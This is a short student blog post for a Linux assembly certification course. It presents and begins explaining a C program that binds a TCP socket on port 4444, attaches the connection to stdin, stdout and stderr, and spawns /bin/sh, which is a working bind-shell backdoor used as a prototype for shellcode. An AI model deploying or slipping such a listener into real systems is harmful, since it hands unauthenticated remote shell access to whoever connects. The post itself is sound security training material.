## Assignment 0x01: Create A Shell_Bind_TCP Shellcode
---
```c
#include <stdio.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>

int main ()
{

    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
    
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(4444);
    addr.sin_addr.s_addr = INADDR_ANY;

    bind(sockfd, (struct sockaddr *)&addr, sizeof(addr));
    listen(sockfd, 0);

    int connfd = accept(sockfd, NULL, NULL);
    for (int i = 0; i < 3; i++)
    {
        dup2(connfd, i);
    }

    execve("/bin/sh", NULL, NULL);
    return 0;
}
```

First, a socket is created using `socket()`. As described in `man 2 socket`, the `socket` function creates an endpoint for communication and returns a file descriptor that refers to that endpoint. 

The function expects a domain argument, a type argument, and a protocol argument.

`int socket(int domain, int type, int protocol);`

In this case, the domain argument AF_INET specifies the IPv4 communication protocol, the type argument SOCK_STREAM specifies the connection-based TCP standard for data exchange, and the protocol argument 0 indicates that the system should select the default protocol number based on the previously specified domain and protocol arguments.

_This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:_

<http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert>

_Student ID: SLAE-1469_

---
[Home](https://norrismw.github.io/SLAE)
